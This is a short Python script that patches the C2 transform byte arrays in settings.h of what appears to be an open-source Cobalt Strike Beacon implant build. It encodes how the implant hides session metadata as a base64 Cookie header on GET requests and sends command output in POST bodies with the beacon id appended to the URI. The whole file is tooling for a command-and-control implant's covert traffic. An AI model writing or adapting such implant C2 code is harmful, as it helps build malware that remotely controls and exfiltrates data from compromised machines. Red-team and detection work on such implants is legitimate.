# -*- coding: utf-8 -*-
r"""fix_blobs.py - fix the transform blobs in settings.h:
BeaconDataStringCopySafe reads ALL remaining bytes (no length prefix!).
HEADER and PARAMETER steps must be LAST, with string data immediately
after the step int (no length, no terminator)."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\bXZb-tmp"
     r"\openbeacon\Beacon\settings.h")
s = io.open(P, encoding="utf-8").read()

def replace_blob(s, name, comment, data):
    start = s.index("static const unsigned char %s[] = {" % name)
    end = s.index("};", start) + 2
    old = s[start:end]
    rows = []
    for i in range(0, len(data), 16):
        rows.append("    " + ", ".join("0x%02x" % b for b in data[i:i+16]) + ",")
    body = chr(10).join(rows).rstrip(",")
    new = ("static const unsigned char %s[] = {" % name + chr(10) +
           "    /* " + comment + " */" + chr(10) +
           body + chr(10) + "};")
    return s[:start] + new + s[end:]

def be(v):
    return [(v >> 24) & 0xff, (v >> 16) & 0xff, (v >> 8) & 0xff, v & 0xff]

# GET request: BUILD(0=session) -> BASE64(3) -> HEADER(6,"Cookie")
# HEADER is last: string data directly follows step int, NO length, NO terminator
req = be(7) + be(0) + be(3) + be(6) + list(b"Cookie")
s = replace_blob(s, "ob_c2_request",
                 "BUILD(session) -> BASE64 -> HEADER(Cookie) - Cookie is LAST step (StringCopySafe eats all)",
                 req)

# POST request: BUILD(1=output) -> PRINT(4)
# bid is appended to URI by beacon.c, body is output
post = be(7) + be(1) + be(4)
s = replace_blob(s, "ob_c2_postreq",
                 "BUILD(output) -> PRINT: body=output; bid appended to URI by beacon.c",
                 post)

io.open(P, "w", encoding="utf-8", newline="").write(s)
print("blobs fixed")
